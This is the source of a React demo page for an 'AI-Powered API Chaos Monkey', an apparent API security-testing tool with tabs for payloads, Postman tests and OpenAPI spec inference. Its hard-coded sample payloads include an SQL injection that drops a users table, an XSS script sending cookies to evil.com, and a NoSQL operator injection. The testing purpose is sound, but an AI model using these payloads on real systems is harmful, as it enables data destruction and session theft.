"use client"

import { useState } from "react"
import { Copy, Play, Upload } from "lucide-react"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import SyntaxHighlighter from "react-syntax-highlighter"
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs"

export default function Home() {
  const [activeTab, setActiveTab] = useState("payload-attack")
  const [payloadUrl, setPayloadUrl] = useState("/login?user=admin")
  const [testDescription, setTestDescription] = useState("")
  const [showPayloads, setShowPayloads] = useState(false)
  const [showTest, setShowTest] = useState(false)
  const [showSpec, setShowSpec] = useState(false)
  const [copied, setCopied] = useState<string | null>(null)

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  const payloads = [
    {
      id: "sqli",
      title: "SQL Injection",
      code: `' OR 1=1; DROP TABLE users; --`,
    },
    {
      id: "xss",
      title: "Cross-Site Scripting (XSS)",
      code: `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`,
    },
    {
      id: "json",
      title: "Malformed JSON",
      code: `{
  "user": "admin",
  "password": "password",
  "token": null,
  "role": {"$gt": ""},
  "permissions": [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
}`,
    },
  ]

  const postmanTest = `pm.test("Payment should fail with negative amount", function () {
  // Set negative amount in request body
  const requestBody = JSON.parse(pm.request.body.raw);
  requestBody.amount = -100;
  pm.request.body.raw = JSON.stringify(requestBody);
  
  // Send the request
  pm.sendRequest(pm.request.url, function (err, res) {
    // Test response
    pm.expect(res.code).to.be.oneOf([400, 422]);
    pm.expect(res.json().error).to.include("negative");
    
    // Verify no transaction was created
    pm.sendRequest({
      url: pm.variables.get("baseUrl") + "/transactions",
      method: "GET",
      header: {
        "Authorization": pm.variables.get("authToken")
      }
    }, function (err, transactionsRes) {
      const transactions = transactionsRes.json();
      const foundNegative = transactions.some(t => t.amount < 0);
      pm.expect(foundNegative).to.be.false;
    });
  });
});`

  const openApiSpec = `{
  "openapi": "3.0.0",
  "info": {
    "title": "Inferred API",
    "version": "1.0.0",
    "description": "API specification inferred from HAR file"
  },
  "paths": {
    "/api/login": {
      "post": {
        "summary": "User authentication",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "properties": {
                  "username": { "type": "string" },
                  "password": { "type": "string" }
                },
                "required": ["username", "password"]
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "Successful login",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "token": { "type": "string" },
                    "user": { "type": "object" }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Authentication failed"
          }
        }
      }
    },
    "/api/payments": {
      "post": {
        "summary": "Process payment",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "properties": {
                  "amount": { "type": "number" },
                  "currency": { "type": "string" },
                  "description": { "type": "string" }
                },
                "required": ["amount", "currency"]
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "Payment processed"
          },
          "400": {
            "description": "Invalid payment data"
          }
        }
      }
    }
  }
}`

  return (
    <main className="min-h-screen bg-black text-white font-mono relative overflow-hidden">
      {/* DEMO MODE Watermark */}
      <div className="fixed top-0 left-0 w-full h-full flex items-center justify-center pointer-events-none z-10">
        <div className="text-blue-500/20 text-7xl font-bold rotate-45 select-none">DEMO MODE</div>
      </div>

      {/* Hero Section */}
      <section className="container mx-auto px-4 pt-16 pb-8 relative z-20">
        <h1 className="text-4xl md:text-6xl font-bold text-center mb-4 text-blue-500 glitch-text">
          <span className="relative inline-block">
            AI-Powered API Chaos Monkey
            <span className="absolute top-0 left-0.5 text-red-500 opacity-70 glitch-1">
              AI-Powered API Chaos Monkey
            </span>
            <span className="absolute top-0 -left-0.5 text-blue-300 opacity-70 glitch-2">
              AI-Powered API Chaos Monkey
            </span>
          </span>
        </h1>
        <p className="text-xl md:text-2xl text-center mb-12 text-blue-200">Break APIs before hackers do</p>

        {/* Tabs */}
        <Tabs defaultValue="payload-attack" className="w-full max-w-4xl mx-auto" onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-3 mb-8">
            <TabsTrigger
              value="payload-attack"
              className="data-[state=active]:bg-blue-600 data-[state=active]:text-white"
            >
              Payload Attack
            </TabsTrigger>
            <TabsTrigger
              value="test-generator"
              className="data-[state=active]:bg-blue-600 data-[state=active]:text-white"
            >
              Test Generator
            </TabsTrigger>
            <TabsTrigger
              value="spec-inferencer"
              className="data-[state=active]:bg-blue-600 data-[state=active]:text-white"
            >
              Spec Inferencer
            </TabsTrigger>
          </TabsList>

          {/* Payload Attack Tab */}
          <TabsContent value="payload-attack" className="border border-blue-500 rounded-lg p-6 bg-black/80">
            <h2 className="text-2xl font-bold mb-4 text-blue-400">Generate Malicious Payloads</h2>
            <div className="mb-6">
              <label className="block mb-2 text-blue-300">Target API Endpoint:</label>
              <Input
                type="text"
                value={payloadUrl}
                onChange={(e) => setPayloadUrl(e.target.value)}
                className="bg-gray-900 border-blue-500 text-white mb-4"
              />
              <Button
                onClick={() => setShowPayloads(true)}
                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 font-bold text-lg"
              >
                GENERATE CHAOS
              </Button>
            </div>

            {showPayloads && (
              <div className="space-y-6 mt-8">
                <h3 className="text-xl text-blue-300">Generated Attack Payloads:</h3>
                {payloads.map((payload) => (
                  <div key={payload.id} className="border border-blue-800 rounded bg-gray-900">
                    <div className="flex justify-between items-center px-4 py-2 bg-blue-900/50 border-b border-blue-800">
                      <h4 className="font-bold">{payload.title}</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleCopy(payload.code, payload.id)}
                        className="text-blue-300 hover:text-white"
                      >
                        {copied === payload.id ? "Copied!" : <Copy size={16} />}
                      </Button>
                    </div>
                    <SyntaxHighlighter
                      language="javascript"
                      style={atomOneDark}
                      customStyle={{ background: "transparent", padding: "1rem" }}
                    >
                      {payload.code}
                    </SyntaxHighlighter>
                  </div>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Test Generator Tab */}
          <TabsContent value="test-generator" className="border border-blue-500 rounded-lg p-6 bg-black/80">
            <h2 className="text-2xl font-bold mb-4 text-blue-400">Generate Postman Tests</h2>
            <div className="mb-6">
              <label className="block mb-2 text-blue-300">Describe your test:</label>
              <Textarea
                value={testDescription}
                onChange={(e) => setTestDescription(e.target.value)}
                placeholder="Describe test (e.g. 'Check if /payments fails when amount is negative')"
                className="bg-gray-900 border-blue-500 text-white mb-4 h-32"
              />
              <Button
                onClick={() => setShowTest(true)}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 font-bold text-lg"
                disabled={!testDescription.trim()}
              >
                GENERATE POSTMAN TEST
              </Button>
            </div>

            {showTest && (
              <div className="mt-8">
                <div className="flex justify-between items-center mb-2">
                  <h3 className="text-xl text-blue-300">Generated Postman Test:</h3>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(postmanTest, "postman")}
                    className="text-blue-300 hover:text-white"
                  >
                    {copied === "postman" ? "Copied!" : <Copy size={16} />}
                  </Button>
                </div>
                <div className="border border-blue-800 rounded bg-gray-900">
                  <SyntaxHighlighter
                    language="javascript"
                    style={atomOneDark}
                    customStyle={{ background: "transparent", padding: "1rem" }}
                  >
                    {postmanTest}
                  </SyntaxHighlighter>
                </div>
              </div>
            )}
          </TabsContent>

          {/* Spec Inferencer Tab */}
          <TabsContent value="spec-inferencer" className="border border-blue-500 rounded-lg p-6 bg-black/80">
            <h2 className="text-2xl font-bold mb-4 text-blue-400">Infer API Specification</h2>
            <div className="mb-6">
              <p className="text-blue-300 mb-4">Upload a HAR file to automatically infer API specifications:</p>
              <div className="flex flex-col items-center justify-center border-2 border-dashed border-blue-500 rounded-lg p-8 bg-gray-900/50">
                <Upload className="w-12 h-12 text-blue-400 mb-4" />
                <Button
                  onClick={() => setShowSpec(true)}
                  className="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 font-bold"
                >
                  UPLOAD HAR FILE
                </Button>
                <p className="mt-2 text-sm text-blue-300">
                  or{" "}
                  <a href="#" className="text-blue-400 underline">
                    use sample HAR
                  </a>
                </p>
              </div>
            </div>

            {showSpec && (
              <div className="mt-8">
                <div className="flex justify-between items-center mb-2">
                  <h3 className="text-xl text-blue-300">Inferred OpenAPI Specification:</h3>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(openApiSpec, "openapi")}
                    className="text-blue-300 hover:text-white"
                  >
                    {copied === "openapi" ? "Copied!" : <Copy size={16} />}
                  </Button>
                </div>
                <div className="border border-blue-800 rounded bg-gray-900">
                  <SyntaxHighlighter
                    language="json"
                    style={atomOneDark}
                    customStyle={{ background: "transparent", padding: "1rem" }}
                  >
                    {openApiSpec}
                  </SyntaxHighlighter>
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>
      </section>

      {/* Footer with Demo Video */}
      <footer className="container mx-auto px-4 py-8 mt-8 border-t border-blue-900 relative z-20">
        <h3 className="text-xl font-bold text-blue-400 mb-4 text-center">See the Chaos Monkey in Action</h3>
        <div className="max-w-3xl mx-auto bg-gray-900 border border-blue-800 rounded-lg overflow-hidden">
          <div className="aspect-video relative flex items-center justify-center bg-black">
            <div className="absolute inset-0 flex items-center justify-center bg-blue-900/20">
              <Button className="bg-blue-600 hover:bg-blue-700 flex items-center gap-2">
                <Play size={16} /> Play Demo Video
              </Button>
            </div>
            <div className="text-center p-4">
              <p className="text-blue-300 text-sm">Demo video would play here in a real application</p>
            </div>
          </div>
        </div>
      </footer>

      {/* Background Effects */}
      <div className="fixed top-0 left-0 w-full h-full pointer-events-none z-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-blue-900/20 via-blue-950/10 to-black"></div>
        <div className="matrix-rain"></div>
      </div>

      {/* CSS for glitch effect and matrix rain */}
      <style jsx global>{`
        @keyframes glitch-1 {
          0% { clip-path: inset(40% 0 61% 0); }
          20% { clip-path: inset(92% 0 1% 0); }
          40% { clip-path: inset(43% 0 1% 0); }
          60% { clip-path: inset(25% 0 58% 0); }
          80% { clip-path: inset(54% 0 7% 0); }
          100% { clip-path: inset(58% 0 43% 0); }
        }
        
        @keyframes glitch-2 {
          0% { clip-path: inset(25% 0 58% 0); }
          20% { clip-path: inset(54% 0 7% 0); }
          40% { clip-path: inset(58% 0 43% 0); }
          60% { clip-path: inset(40% 0 61% 0); }
          80% { clip-path: inset(92% 0 1% 0); }
          100% { clip-path: inset(43% 0 1% 0); }
        }
        
        .glitch-1 {
          animation: glitch-1 750ms infinite linear alternate-reverse;
        }
        
        .glitch-2 {
          animation: glitch-2 750ms infinite linear alternate-reverse;
        }
        
        .matrix-rain {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(to bottom, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 75%, rgba(0,0,0,0.9) 100%), 
                      url("data:image/svg+xml,%3Csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='matrix' width='50' height='50' patternUnits='userSpaceOnUse'%3E%3Ctext x='10' y='20' fill='rgba(0,100,255,0.1)' fontFamily='monospace'%3E01%3C/text%3E%3Ctext x='30' y='40' fill='rgba(0,100,255,0.1)' fontFamily='monospace'%3E10%3C/text%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='url(%23matrix)'/%3E%3C/svg%3E");
          opacity: 0.3;
        }
      `}</style>
    </main>
  )
}
